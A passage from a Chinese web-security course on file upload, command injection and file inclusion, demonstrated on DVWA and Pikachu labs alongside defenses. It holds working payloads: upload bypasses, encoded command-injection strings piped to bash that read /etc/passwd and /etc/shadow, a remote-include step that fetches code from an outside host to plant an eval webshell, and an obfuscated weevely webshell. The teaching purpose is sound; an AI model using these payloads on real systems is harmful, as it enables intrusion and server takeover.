限制。这里的篡改内容，可依据前端 JS的校验内容来定，比如后缀名、
Content-type 等等。
</p>
</div>
</div>
<div id="outline-container-文件头绕过" class="outline-4">
<h4 id="文件头绕过">3.文件头绕过</h4>
<div class="outline-text-4" id="text-文件头绕过">
<p>
不同文件格式有不同的文件头，比如下表：
</p>


<figure id="orgba3a4b4">
<img src="./images/Cip5yGAOphaAXf44AAExycN6r9o883.png" alt="Cip5yGAOphaAXf44AAExycN6r9o883.png" width="80%">

</figure>

<p>
这样我们就可以尝试在 php文件前面加个图片文件头，看是否可以绕过检测，比
如下面 shell.php 内容：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">BM &lt;?php phpinfo(); ?&gt;
</pre>
</div>

<p>
从这也可以看出，检测文件格式最后是文件头＋后缀名都一块检测，否则仍有绕过的可能。
</p>
</div>
</div>
<div id="outline-container-截断" class="outline-4">
<h4 id="截断">4.%00 截断</h4>
<div class="outline-text-4" id="text-截断">
<p>
前端限制对防御上传漏洞的能力相对是比较弱的，更多还是得靠服务端，但如果
限制不当，仍有可能绕过。比如对文件后缀、路径上的检测，有时可通过添加％
00 截断来绕过，比如：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">upload.php?type=image&amp;file=shell.php%00.jpg
</pre>
</div>
</div>
</div>
<div id="outline-container-大小写绕过" class="outline-4">
<h4 id="大小写绕过">5.大小写绕过</h4>
<div class="outline-text-4" id="text-大小写绕过">
<p>
有时检测未区分文件名大小写时，可使用此方法绕过。
</p>
</div>
</div>
<div id="outline-container-后缀别名绕过" class="outline-4">
<h4 id="后缀别名绕过">6.后缀别名绕过</h4>
<div class="outline-text-4" id="text-后缀别名绕过">
<p>
有些执行脚本存在多个后缀别名，若网站对此检测不全时，也有可能绕过，不同
语言的常用后缀如下表：
</p>


<figure id="orga65b8e2">
<img src="./images/Cip5yGAOpiiAcqiXAAEw44DP0TU466.png" alt="Cip5yGAOpiiAcqiXAAEw44DP0TU466.png" width="80%">

</figure>

<p>
html 文件上传后可用于 XSS或者钓鱼欺骗等攻击，相比其他语言可直接在服务
端执行代码的危害低一些，但仍要重视。
</p>
</div>
</div>
<div id="outline-container-结合其他漏洞绕过" class="outline-4">
<h4 id="结合其他漏洞绕过">7.结合其他漏洞绕过</h4>
<div class="outline-text-4" id="text-结合其他漏洞绕过">
<p>
可利用一些服务器的解析漏洞来绕过，比如利用 apache对不同后缀名的处理顺
序机制，当后缀名不可识别时，就往左判断，比如shell.php.php123 有可能被
识别为 php 类型来执行。
</p>

<p>
nginx 也出现过类似漏洞，比如 1.jpg/1.php 被当作 php来执行，这种服务端
解析漏洞就比较难单纯依靠网站代码来解决，前提还是需要先堵住漏洞。
</p>
</div>
</div>
</div>
<div id="outline-container-如何发现上传漏洞" class="outline-3">
<h3 id="如何发现上传漏洞">如何发现上传漏洞</h3>
<div class="outline-text-3" id="text-如何发现上传漏洞">
</div>
<div id="outline-container-黑盒扫描" class="outline-4">
<h4 id="黑盒扫描">1.黑盒扫描</h4>
<div class="outline-text-4" id="text-黑盒扫描">
<p>
在日常的网站扫描中，一般不会上传真实的木马，常常使用 phpinfo来代替，这
样对业务的影响是最小的。有时也会 echo一段字符串来代替，但这种有时被外
部发现，又可能被外部炒作被黑，存在公关风险。
</p>

<p>
当爬虫网页时，若发现存在文件上传功能，就自动构造请求上传包含以下代码的文件：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php phpinfo(); ?&gt;
</pre>
</div>

<p>
先根据返回包特征判断是否上传成功，然后再去寻找上传路径。扫描器可以设置
一个随机文件名，然后再常见目录去检测是否上传成功。
</p>

<p>
如果是自家服务器，你倒可以在服务器上布署个文件创建的监控，然后根据文件
名获取上传路径，最后访问文件路径判断是否可访问。这种做法的通用相对比较
差，很多时候也并不是对自己服务器的测试。
</p>
</div>
</div>
<div id="outline-container-流量监测" class="outline-4">
<h4 id="流量监测">2.流量监测</h4>
<div class="outline-text-4" id="text-流量监测">
<p>
由于黑盒扫描对上传文件路径的确认比较困难，所以流量监测成为一种常用方法，
不仅是上传漏洞，其实其他漏洞也同样适用的。
</p>

<p>
通过监测流量中疑似的webshell，获取相关请求数据告警出来，然后再人工确认，
我们在用这种方法在实际业务中多次发现上传漏洞。
</p>
</div>
</div>
<div id="outline-container-白盒审计" class="outline-4">
<h4 id="白盒审计">3.白盒审计</h4>
<div class="outline-text-4" id="text-白盒审计">
<p>
如果手上有源代码，直接审计代码也是一种不错方式。在 PHP 中是通过 $_FILE
来读取文件，它拥有以下几个常用属性：
</p>

<ul class="org-ul">
<li>$_FILES[file]['name']：上传文件名</li>

<li>$_FILES[file]['tmp_name']：存储在服务器的文件的临时副本的名称</li>

<li>$_FILES[file]['size']：上传文件大小</li>

<li>$_FILES[file]['type']：上传文件类型</li>
</ul>

<p>
其中的 name 与 tmp_name可以理解为污染源触发上传文件存储的函数常见于：
move_uploaded_file，审计代码时就可以先从此函数入手，看其参数是否有来源
于上述污染源数据，并且中间无任何的上传限制，那就有可能存在上传漏洞，最
后再手工上传验证下。
</p>
</div>
</div>
</div>
<div id="outline-container-漏洞防御" class="outline-3">
<h3 id="漏洞防御">漏洞防御</h3>
<div class="outline-text-3" id="text-漏洞防御">
<p>
对于上传漏洞的修复和防御，可以从以下几方面入手：
</p>

<p>
<b>1</b>. 严格检测上传文件后缀名、文件头、Content-type，尽量采用白名单方式
限制。
</p>

<p>
<b>2</b>. 重编码文件，比如对图片或视频做转换处理。
</p>

<p>
<b>3</b>. 限制文件大小，避免被恶意上传大文件造成存储空间不足，进而网站无法
正常运行。
</p>

<p>
<b>4</b>. 在服务端本地检测Webshell，发现后告警出来，人工确认后再删除，同时
排查是否为外部入侵导致的，查日志去追踪可能存在的漏洞来源。
</p>

<p>
<b>5</b>. 使用 WAF 拦截木马的上传，这种可能比较容易被绕过。
</p>

<p>
<b>6</b>. 使用 RASP 在服务端中对于执行脚本的关键函数进行 hook，比如 php
eval，在触发外部数据输入执行时就告警和阻断。
</p>

<p>
<b>7</b>. 限制上传目录可不解析，不同的服务器有不同的配置方式，比如 Nginx可
按如下方式配置。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">location ~* ^/uploads/.*\.(php|php5)$ 
{
  deny all;
}
</pre>
</div>

<p>
<b>8</b>. 上传文件重命名，建议使用随机文件名。
</p>

<p>
<b>9</b>. 隐藏上传文件路径相关信息，比如关闭错误回显，不要像本课中的 DVWA靶
场的题目那样直接把上传路径直接返回。
</p>
</div>
</div>
<div id="outline-container-小结" class="outline-3">
<h3 id="小结">小结</h3>
<div class="outline-text-3" id="text-小结">
<p>
本节课主要介绍文件上传漏洞的成因、利用、检测与防御，也简单介绍了一句话
木马、常用Webshell 工具，同时重点介绍了一些绕过上传限制的常用技巧。
</p>

<p>
在实际渗透测试过程中，你需要结合业务实际场景来灵活运用，最好是摸清网站
的一些限制策略，再做测试用例上的调整，这样才会比较适用。
</p>

<p>
下一讲开始，我将会介绍“命令注入”漏洞，这也是一种常见的严重漏洞，严重
到需要企业安全人员半夜起来加班应急。我将介绍命令注入漏洞的成因、常见的
利用技巧，并会总结一些常见的限制绕过方法，以及漏洞挖掘与防御的主流方式，
所以别忘来听课～
</p>
</div>
</div>
</section>
<section id="outline-container-h:032f9368-3461-4778-85c1-3600c352f2a6" class="outline-2">
<h2 id="h:032f9368-3461-4778-85c1-3600c352f2a6">命令与代码注入：常令安全人员半夜应急的漏洞</h2>
<div class="outline-text-2" id="text-h:032f9368-3461-4778-85c1-3600c352f2a6">
<p>
上一讲介绍了文件上传漏洞的攻防原理，利用可能直接控制服务器，危害严重。
</p>

<p>
本节课再给大家介绍一种叫命令注入的严重漏洞，由于它也能 <code>直接控制服务器</code> ，因此常令企业安全人员半夜应急。
</p>

<p>
为何是半夜呢？因为搞站的人经常是晚上下班后开搞，也专业挑安全人员下班的
时间，减少被发现和阻断的情况。
</p>
</div>
<div id="outline-container-命令注入漏洞成因" class="outline-3">
<h3 id="命令注入漏洞成因">命令注入漏洞成因</h3>
<div class="outline-text-3" id="text-命令注入漏洞成因">
<p>
命令注入，主要指应用在服务器或客户端上，允许拼接系统命令并执行而造成的
漏洞。对于web 网站，通常是针对服务器的攻击利用。
</p>

<p>
PHP 中常见的系统命令执行函数有：
</p>

<ul class="org-ul">
<li>system()</li>

<li>exec()</li>

<li>shell_ exec()</li>

<li>proc_open()</li>

<li>popen()</li>

<li>passthru()</li>

<li>&#x2026;&#x2026;</li>
</ul>

<p>
如果外部用户的输入数据（如 GET、POST、Cookie等数据）未做任何过滤或转义，
直接转递给上述命令执行函数，就会造成命令注入漏洞。
</p>

<p>
总结下形成命令注入漏洞的条件：
</p>

<ul class="org-ul">
<li>内部存在命令执行函数的调用</li>

<li>用户输入数据作为参数传递给命令执行函数</li>

<li>输入参数未做任何过滤或转义</li>
</ul>
</div>
</div>
<div id="outline-container-漏洞利用实战" class="outline-3">
<h3 id="漏洞利用实战">漏洞利用实战</h3>
<div class="outline-text-3" id="text-漏洞利用实战">
</div>
<div id="outline-container-命令拼接技巧" class="outline-4">
<h4 id="命令拼接技巧">1.命令拼接技巧</h4>
<div class="outline-text-4" id="text-命令拼接技巧">
<p>
注入命令过程中，常常需要使用一些系统命令的拼接方式，以达到更多复杂功能
的实现，尤其是存在限制的情况，运用好可用来绕过限制。
</p>

<p>
常用拼接符号如下。
</p>

<ul class="org-ul">
<li><b>&amp;&amp;</b></li>
</ul>

<p>
命令格式：cmd1 &amp;&amp; cmd2，cmd1 执行成功后才会执行 cmd2。
</p>

<ul class="org-ul">
<li><b>|</b></li>
</ul>

<p>
命令格式：cmd1 | cmd2，cmd1 的执行结果传递给 cmd2 去执行。
</p>

<ul class="org-ul">
<li><b>||</b></li>
</ul>

<p>
命令格式：cmd1 || cmd2，cmd1 执行失败后就执行 cmd2。
</p>

<ul class="org-ul">
<li><b>&amp;</b></li>
</ul>

<p>
命令格式：cmd1 &amp; cmd2，&amp; 用于分隔多个命令，命令按顺序 cmd1、cmd2 执行。
</p>

<ul class="org-ul">
<li><b>;</b></li>
</ul>

<p>
命令格式：cmd1 ; cmd2，分号用于分隔多个命令去执行，命令按顺序 cmd1、cmd2
执行。
</p>

<ul class="org-ul">
<li><b>``</b></li>
</ul>

<p>
命令格式：=cmd=，注意这里是对反斜号，代表命令执行结果的输出，即命令替换。
</p>

<ul class="org-ul">
<li><b>$()</b></li>
</ul>

<p>
命令格式：$(cmd)，用于命令替换，适用于 cmd 中需要使用多个拼接符。
</p>

<ul class="org-ul">
<li><b>()</b></li>
</ul>

<p>
命令格式：(cmd1;cmd2)，合并多个命令，重新开启子 shell 来执行命令。
</p>

<ul class="org-ul">
<li><b>{}</b></li>
</ul>

<p>
命令格式：{cmd,arg}，Linux bash 下用于合并多个命令及参数，在当前 shell
执行。
</p>
</div>
</div>
<div id="outline-container-靶场演练" class="outline-4">
<h4 id="靶场演练">2.靶场演练</h4>
<div class="outline-text-4" id="text-靶场演练">
<p>
以 DVWA 靶场的命令注入题目为例，漏洞代码如下。
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'Submit'</span> ]  ) ) {
    // Get input
    $<span style="color: #a0522d;">target</span> = $<span style="color: #a0522d;">_REQUEST</span>[ <span style="color: #8b2252;">'ip'</span> ];
    // Determine OS and execute the ping command.
    <span style="color: #a020f0;">if</span>( stristr( php_uname( <span style="color: #8b2252;">'s'</span> ), <span style="color: #8b2252;">'Windows NT'</span> ) ) {
        // Windows
        $<span style="color: #a0522d;">cmd</span> = shell_exec( <span style="color: #8b2252;">'ping  '</span> . $<span style="color: #a0522d;">target</span> );
    }
    <span style="color: #a020f0;">else</span> {
        // *nix
        $<span style="color: #a0522d;">cmd</span> = shell_exec( <span style="color: #8b2252;">'ping  -c 4 '</span> . $<span style="color: #a0522d;">target</span> );
    }
    // Feedback for the end user
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;{$cmd}&lt;/pre&gt;"</span>;
}
?&gt;
</pre>
</div>

<p>
它在获取用户输入的 IP 地址后直接传递给 shell_exec函数去执行，如果我们
利用前面介绍的命令拼接方式去注入其他命令就可以被执行，比如通过分号输入
以下命令：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">127.0.0.1; id
</pre>
</div>

<p>
提交后可以看到 id 命令的执行结果，说明命令注入成功。
</p>


<figure id="org5997cea">
<img src="./images/Cip5yGASiyeAblmvAAYSmm7bGoE695.png" alt="Cip5yGASiyeAblmvAAYSmm7bGoE695.png" width="80%">

</figure>

<p>
图 1 利用漏洞执行命令 id
</p>

<p>
其他连接符号的利用，你也可以尝试下。
</p>

<p>
此处是有回显内容的，若无回显就需要使用一些盲注技巧，比如 sleep延时命令：
</p>

<pre class="example" id="org2e20705">
127.0.0.1 &amp;&amp; sleep 5
</pre>

<p>
也可使用输出重定向符号“&gt;”与“&gt;&gt;”，输出内容到指定文件，然后访问对应文件是否存在，比如：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">127.0.0.1; echo "test" &gt; test.txt (由于靶场环境限制无法在网站根目录创建文件，所以此用例不会成功)
127.0.0.1; echo 'test'&gt;/app/hackable/uploads/text.txt
提交上述用例后，访问http://127.0.0.1/hackable/uploads/text.txt 即可看到输出成功
</pre>
</div>

<p>
执行效果如图 2 所示。
</p>


<figure id="orga41d85c">
<img src="./images/CgpVE2ASizuAFANhAAF--IPq7VM659.png" alt="CgpVE2ASizuAFANhAAF--IPq7VM659.png" width="80%">

</figure>

<p>
图 2 注入命令写文件成功
</p>

<p>
还有访问自己的服务器，看日志判断是否命令执行成功，比较便捷的方式就是使
用 BurpSuit Collaborator ，在诸多盲注场景下它都适用。
</p>
</div>
</div>
<div id="outline-container-常用的限制绕过技巧" class="outline-4">
<h4 id="常用的限制绕过技巧">3.常用的限制绕过技巧</h4>
<div class="outline-text-4" id="text-常用的限制绕过技巧">
<p>
<b>（1）绕过单命令限制</b>
</p>

<p>
命令注入点有时是某一执行程序的参数，比如 ls 命令，注入再多的参数也难达
到控制服务器的目的，此时我们就需要采用多命令注入方式，你可以回头再看下
刚刚讲的命令拼接技巧中介绍的各种方法。
</p>

<p>
<b>（2）空格绕过</b>
</p>

<p>
有时会遇到对输入命令参数进行空格过滤，比如输入命令：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">cat /etc/passwd;
</pre>
</div>

<p>
就会变成：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">cat/etc/passwd;
</pre>
</div>

<p>
导致执行失败。
</p>

<p>
你可以尝试以下几种方法去绕过。
</p>

<ul class="org-ul">
<li><b>IFS 分隔符</b></li>
</ul>

<p>
IFS（Internal Field Seperator，内部域分隔符）是 shell下的特殊环境变量，
可以是空格、Tab、换行符或者其他自定义符号，如图 3 利用IFS 分隔符成功读
取到敏感文件。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">cat$IFS/etc/passwd
</pre>
</div>


<figure id="org6251329">
<img src="./images/CgqCHmASi1CATWHbAARYJuJkPEw289.png" alt="CgqCHmASi1CATWHbAARYJuJkPEw289.png" width="80%">

</figure>

<p>
图 3 利用 IFS 分隔符绕过空格限制
</p>

<ul class="org-ul">
<li><b>URL 编码</b></li>
</ul>

<p>
可以在请求参数中用 ％20、+、%09(tab) 等方式来绕过：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">cat%20/etc/passwd
cat+/etc/passwd
cat%09/etc/passwd
</pre>
</div>

<ul class="org-ul">
<li><b>{cmd,arg}</b></li>
</ul>

<p>
在 Linux bash 环境中可以使用花括号 {cmd,arg} 扩展来绕过：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">{cat,etc/passwd}
</pre>
</div>

<p>
这个依赖 bash 环境，并不是那么通用的方式，比如在 DVWA 靶场中就不适用。
</p>

<p>
<b>（3）黑名单绕过</b>
</p>

<p>
绕过黑名单就是先探测哪些是黑名单，尽量避开不用，如果还不行可以考虑以下方法。
</p>

<ul class="org-ul">
<li><b>shell 特殊变量</b></li>
</ul>

<p>
先看下 shell 中的一些特殊变量：
</p>

<pre class="example" id="orge9a19e9">
$n 传递给脚本或函数的参数。 n 是一个数字，表示第几个参数，例如第一个参数是 $1
$* 传递给脚本的所有参数，全部参数合为一个字符串
$@ 传递给脚本的所有参数，每个参数为独立字符串

注意：$@ $* 只在被双引号包起来的时候才会有差异
</pre>

<p>
比如 cat 命令被禁，利用上述特殊变量，我们就可以这样构造来绕过：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">ca$1t /etc/passwd
cat$*t /etc/passwd
ca$@t /etc/passwd
</pre>
</div>

<ul class="org-ul">
<li><b>编码绕过</b></li>
</ul>

<p>
直接将命令字符串转换成 URL 编码、hex 码、base 64等编码，再转换回来执行：
</p>

<div class="org-src-container">
<pre class="src src-lang-shell"># Base64编码命令“cat /etc/passwd”
echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d|bash
# Hex编码命令“cat /etc/passwd”
echo "636174202f6574632f706173737764"|xxd -r -p|bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
# URL编码
cat%20%2Fetc%2Fpasswd
</pre>
</div>

<ul class="org-ul">
<li><b>变量自定义</b></li>
</ul>

<p>
将黑名单内容拆分到不同的变量，再拼接起来执行。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">a=c;b=at;c="/etc/passwd";$a$b $c
</pre>
</div>

<ul class="org-ul">
<li><b>反斜杠</b></li>
</ul>

<p>
反斜杠的作用就是转义，因此可用来拆分黑名单字符串，但又不影响结果。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">c\a\t /et\c/pas\s\wd
</pre>
</div>

<ul class="org-ul">
<li><b>单双引号</b></li>
</ul>

<p>
单双引号内的内容会被当作字符串处理，跟其他字符串可拼接出我们需要的命令行字符串。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">c"a"t /et''c/p'a'sswd
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-挖掘命令注入漏洞" class="outline-3">
<h3 id="挖掘命令注入漏洞">挖掘命令注入漏洞</h3>
<div class="outline-text-3" id="text-挖掘命令注入漏洞">
</div>
<div id="outline-container-代码审计" class="outline-4">
<h4 id="代码审计">1.代码审计</h4>
<div class="outline-text-4" id="text-代码审计">
<p>
代码审计思路就是追踪污点（用户可控数据，如 Get、Post数据等等）的传播，
看是否未经限制就传递给命令执行函数（system、exec、shell_ exec 等等）。
</p>
</div>
</div>
<div id="outline-container-黑盒扫描" class="outline-4">
<h4 id="黑盒扫描">2.黑盒扫描</h4>
<div class="outline-text-4" id="text-黑盒扫描">
<p>
通过漏洞扫描器来检测漏洞，对用户输入参数去构造一些命令，然后检测返回结
果，最常用的无害命令就是 sleep 函数，看延时情况来判断是否执行成功，无论
执行结果有无回显，均可适用。
</p>

<p>
一些常用的 Linux 平台的命令注入测试用例如下：
</p>

<pre class="example" id="org65017f3">
&amp;lt;!--#exec%20cmd=&amp;quot;/bin/cat%20/etc/passwd&amp;quot;--&amp;gt;
&amp;lt;!--#exec%20cmd=&amp;quot;/bin/cat%20/etc/shadow&amp;quot;--&amp;gt;
&amp;lt;!--#exec%20cmd=&amp;quot;/usr/bin/id;--&amp;gt;
&amp;lt;!--#exec%20cmd=&amp;quot;/usr/bin/id;--&amp;gt;
/index.html|id|
;id;
;id
;netstat -a;
;system('cat%20/etc/passwd')
;id;
|id
|/usr/bin/id
|id|
|/usr/bin/id|
||/usr/bin/id|
|id;
||/usr/bin/id;
;id|
;|/usr/bin/id|
……
</pre>

<p>
Windows 平台以及其他更多的测试用例可参考
<a href="https://github.com/payloadbox/command-injection-payload-list">command-injection-payload-list</a>。
</p>
</div>
</div>
</div>
<div id="outline-container-漏洞防御" class="outline-3">
<h3 id="漏洞防御">漏洞防御</h3>
<div class="outline-text-3" id="text-漏洞防御">
</div>
<div id="outline-container-代码层面的漏洞规避" class="outline-4">
<h4 id="代码层面的漏洞规避">1.代码层面的漏洞规避</h4>
<div class="outline-text-4" id="text-代码层面的漏洞规避">
<p>
<b>尽量不用系统命令执行函数</b> ，这是最简单粗暴的方式，但也是最有效的方式。
很多方式其实是可以通过一些语言内置 API 完成，这些攻击者是无法控制 API
去执行其他预料之外的命令，除非 API存在漏洞。
</p>

<p>
如果一定要使用命令执行函数，就尽量不要将外部可控数据作为命令行参数。
</p>

<p>
如果要将用户可控数据传递给命令执行函数，那首先推荐 <code>白名单方式</code> ，然后
再是考虑 <code>转义过滤</code> ，以及 <code>数据格式校验</code> 。比如靶场题目是输入IP 地址，
那你可以使用正则做 IP 格式的检测，不符合就拒绝请求。总之，尽可能限制可
输入参数的范围，比如仅允许数字或者数字字母等方式。
</p>

<blockquote>
<p>
转义过滤：可以使用 escapeshellcmd 函数对整个命令字符串作转义，它会在以 下字符之前插入反斜线：&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和\xFF，但即使如此，攻 击者还是可以传入任意数量的参数，此时可以使用escapeshellarg() 函数对单 个参数进行转义。
</p>
</blockquote>
</div>
</div>
<div id="outline-container-命令执行监控与阻断" class="outline-4">
<h4 id="命令执行监控与阻断">2.命令执行监控与阻断</h4>
<div class="outline-text-4" id="text-命令执行监控与阻断">
<p>
基于命令执行函数监控，比如 PHP 环境下对 system 函数进行 hook，Java环境
下的 java.lang.Runtime.exec()函数，当漏洞触发时可告警出来，并支持阻断
功能，这就是前面课程多次提到过的RASP 方案，准确率理论上可达到 100％。
</p>

<p>
推荐百度开源的 OpenRASP 产品，下图是其拦截 JSP 命令执行漏洞的事件截图。
</p>


<figure id="orgc551cd8">
<img src="./images/CgpVE2ASi3yACySBAAMVN4nSHBY967.png" alt="CgpVE2ASi3yACySBAAMVN4nSHBY967.png" width="80%">

</figure>

<p>
图 4 OpenRASP 拦截命令执行
</p>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
本课主要以 PHP 环境下的“命令注入”场景作为演示，介绍了命令注入漏洞的成
因，以及常见的利用技巧，特别总结了些常见的限制绕过方法，最后同样讲解漏
洞挖掘与防御的主流方式。
</p>

<p>
命令注入原理和利用相对比较简单，但在真实业务场景中，用户可控变量的传递
往往比较复杂，并不一定那么容易发现和构造利用，往往是黑盒扫描与白盒代码
审计相结合去发现，业务上线后再结合 RASP 等安全系统去监控和拦截。
</p>

<p>
WAF在命令注入检测中有作用相对比较有限，因为有些命令就是简单字母字符串，
比如 id。拦截此参数很大概率会连正常请求都阻断点，会影响正常业务功能，
所以很多时候都是设法从程序运行环境、系统底层去做检测与拦截。
</p>
</div>
</div>
</section>
<section id="outline-container-h:3c729f69-744e-413e-9f8a-fbb0534cb569" class="outline-2">
<h2 id="h:3c729f69-744e-413e-9f8a-fbb0534cb569">文件包含：不受限地引入文件可能导致网站被入侵</h2>
<div class="outline-text-2" id="text-h:3c729f69-744e-413e-9f8a-fbb0534cb569">
<p>
从这一讲开始，我将会向你介绍 PHP 中常见的“文件包含漏洞”，它可以造成
任意代码执行、控制服务器，危害也很大。它本质上如同 XSS 一样，都是代码
注入导致的漏洞，只是它们注入代码的语言有所差异。
</p>

<p>
很多语言支持使用包含文件，这样允许开发者把可重复使用的代码存入单个文件
中，在未来需要使用时，将它包含在其他代码文件中即可使用。
</p>

<p>
如果是像 C/C++ 这种编译语言，即使可以包含任意文件，若没有调用其中函数
也不会有什么影响；但是像 PHP 这种解析型语言，文件放在服务器上被访问就
可能被执行了，PHP 中常用的文件包含函数有：
</p>

<ul class="org-ul">
<li>include()</li>

<li>include_once()</li>

<li>require()</li>

<li>require_once()</li>
</ul>

<p>
当上述函数参数被外部任意控制时，就可以引用包含恶意代码的文件，导致执行
恶意代码，这就是漏洞产生的原因。比如如下漏洞代码，由外部的 GET 参数
filename 控制包含的文件路径，就导致文件包含漏洞的产生。
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
    $filename  = $_GET['filename'];
    include($filename);
?&gt;
</pre>
</div>

<p>
根据所包含的文件位置，可以分为 <code>远程文件包含</code> 和 <code>本地文件包含</code> 。
</p>
</div>
<div id="outline-container-远程文件包含" class="outline-3">
<h3 id="远程文件包含">远程文件包含</h3>
<div class="outline-text-3" id="text-远程文件包含">
<p>
若所包含的文件位于远程服务器，那么它就属于远程文件包含，这种情况需要服
务端的php.ini 支持以下配置：
</p>

<ul class="org-ul">
<li>allow_url_fopen = On（允许打开远程文件）</li>

<li>allow_url_include = On（允许包含远程文件，在 PHP 5.2 之后默认关闭）</li>
</ul>

<p>
以 Pikachu 靶场中的“File Inclusion(remote)”题目为例，先来看题目界面：
</p>


<figure id="orgc6b138e">
<img src="./images/Cip5yGAX4A2AGQJLAALnh3QheXo648.png" alt="Cip5yGAX4A2AGQJLAALnh3QheXo648.png" width="80%">

</figure>

<p>
图 1 Pikachu File Inclusion(remote)
</p>

<p>
关键的漏洞代码如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">if(isset($_GET['submit']) &amp;&amp; $_GET['filename']!=null){
        $filename=$_GET['filename'];
        include "$filename";//变量传进来直接包含,没做任何的安全限制
}
</pre>
</div>

<p>
给 GET 参数 filename 传递个远程 PHP文件地址即可包含进去，造成代码执行。
我已经在另一台机器上存放 phpinfo.php 执行 phpinfo() 函数，地址是
<a href="http://www.1491.com.tw/phpinfo.php">&lt;http://127.0.0.1/phpinfo.php</a>&gt; ，phpinfo.php代码如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php phpinfo(); ?&gt;
</pre>
</div>

<p>
此处我使用 Trmper Chrome 去抓包，然后在题目上的下拉菜单中选一个，点“提
交”：
</p>


<figure id="org4c0daf9">
<img src="./images/CgqCHmAX4CWALTY8AAQPl3E0Ay4160.png" alt="CgqCHmAX4CWALTY8AAQPl3E0Ay4160.png" width="80%">

</figure>

<p>
图 2 用 Tamper Chrome 抓包
</p>

<p>
得到 GET 请求地址与参数，可以看出用于包含文件的参数 filename 被设置为
"include/file3.php"：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1:8080/vul/fileinclude/fi_remote.php?filename=include%2Ffile3.php&amp;submit=%E6%8F%90%E4%BA%A4
</pre>
</div>

<p>
修改 filename 参数为 <a href="http://www.1491.com.tw/phpinfo.php">http://www.1491.com.tw/phpinfo.php</a> ，该
phpinfo.php 就执行 phpinfo() 函数，访问如下 URL：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1:8080/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/phpinfo.php&amp;submit=%E6%8F%90%E4%BA%A4
</pre>
</div>

<p>
phpinfo 执行成功了：
</p>


<figure id="org067ae8a">
<img src="./images/CgqCHmAX4DSAJYH3AAQINnkRH5s611.png" alt="CgqCHmAX4DSAJYH3AAQINnkRH5s611.png" width="80%">

</figure>

<p>
图 3 远程文件包含执行 phpinfo
</p>

<p>
接入来利用就简单了，我们直接远程包含一个创建一句话木马的 txt 文件，不
用 PHP 后缀是为了避免在自己服务器被执行。
</p>

<p>
为了演示，我在 <a href="http://127.0.0.1/shell.txt">http://127.0.0.1/shell.txt</a> 创建文件（如果你没有自己的
服务器，去 github 上存储一个木马文件也是可行的），写入如下代码，用于生
成一句话木马：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
  $a = "&lt;?php eval(\$_POST['Cknife'])?&gt;";
  file_put_contents("a.php",$a);
?&gt;
</pre>
</div>

<p>
然后访问如下 URL 就会在服务端生成一句话木马文件 a.php：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://127.0.0.1:8080/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/shell.txt&amp;submit=%E6%8F%90%E4%BA%A4
</pre>
</div>

<p>
成功生成一句话木马文件 a.php：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">sudo docker exec -it 7286434c6e88 /bin/bash
root@7286434c6e88:/# cat /var/www/html/a.php
&lt;?php eval($_POST['Cknife'])?&gt;
</pre>
</div>

<p>
与《13 |文件上传漏洞：种植服务器木马的捷径》中关于文件上传漏洞利用的方
法一样，你可以用Cknife、菜刀、冰蝎等客户端工具去连接一句话木马，就可以
直接控制服务器了，此处不再赘述。
</p>

<p>
前面介绍的一句话木马比较容易被检测到，个人喜欢使用 <a href="https://github.com/epinna/weevely3">weevely3</a> ，因为它支
持变形的一句话木马：
</p>

<div class="org-src-container">
<pre class="src src-sh">$ python3 weevely.py
[+] weevely 4.0.1
[!] Error: the following arguments are required: path
[+] Run terminal or command on the target
    weevely &lt;URL&gt; &lt;password&gt; [cmd]
[+] Recover an existing session
    weevely session &lt;path&gt; [cmd]
[+] Generate new agent
    weevely generate &lt;password&gt; &lt;path&gt;

$ python3 weevely.py generate <span style="color: #8b2252;">'test'</span> ./shell.php
Generated <span style="color: #8b2252;">'./shell.php'</span> with password <span style="color: #8b2252;">'test'</span> of 761 byte size.
</pre>
</div>

<p>
看下生成的 shell.php 代码，可以看到其内容都是经过混淆的，肉眼是很难直
接看懂的，有助于逃过一些木马的查杀。
</p>

<div class="org-src-container">
<pre class="src src-sh">$ cat shell.php
&lt;?php
$<span style="color: #a0522d;">S</span>=<span style="color: #8b2252;">'!("/$^!kh(.+^!)^!$kf/",@file^!_g^!et_content^!s("p^!hp^!://input"),$m^!)=^!=1) {@ob_star^!t^!();@ev'</span>;
$<span style="color: #a0522d;">p</span>=<span style="color: #8b2252;">'$^!k^!="098f6bcd";$kh="4^!62^!1d373c^!ad^!e";$kf^!="4e832627b^!4f6";$p="q^!BSPYX^!xS^!wBm8fbHZ";f^!u'</span>;
